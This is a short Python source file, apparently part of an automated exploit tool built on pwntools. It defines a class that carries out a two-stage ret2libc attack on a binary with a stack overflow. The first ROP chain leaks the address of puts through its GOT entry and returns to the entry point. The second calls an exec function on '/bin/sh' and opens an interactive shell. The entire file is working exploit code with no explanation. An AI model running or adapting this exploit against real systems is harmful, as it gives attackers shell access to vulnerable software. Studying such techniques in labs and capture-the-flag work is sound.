from pwn import *


class Exploiter:
    def __init__(self, binary, vuln_details):
        self.binary = binary
        self.vuln_details = vuln_details

    def leak_address_chain(self, rop: ROP):
        bin_elf = self.binary.elf
        rop.call(bin_elf.plt['puts'], [bin_elf.got['puts']])
        rop.call(bin_elf.entry)

    def get_shell_chain(self, rop: ROP):
        exec_func = self.binary.find_exec_function(search_libc=True)
        binsh = self.binary.find_binsh(search_libc=True)
        exit_func = self.binary.find_function("exit", search_libc=True)
        rop.call(exec_func, [binsh])
        rop.call(exit_func)

    def apply_crash_input(self, process, rop):
        process.recvuntil(b"\n")
        input = self.vuln_details['input']
        offset = self.vuln_details['offset']
        crash_input = input[0:offset]
        rop.raw(crash_input)

    def exploit(self):
        process = self.binary.elf.process()

        rop = ROP([self.binary.elf])
        self.apply_crash_input(process, rop)
        self.leak_address_chain(rop)
        process.sendline(rop.chain())

        leak = unpack(process.recvuntil(b"\n").rstrip().ljust(8, b'\x00'))
        self.binary.adjust_libc_base(leak)

        rop_libc = ROP([self.binary.libc])
        self.apply_crash_input(process, rop_libc)
        self.get_shell_chain(rop_libc)
        process.sendline(rop_libc.chain())

        process.interactive()
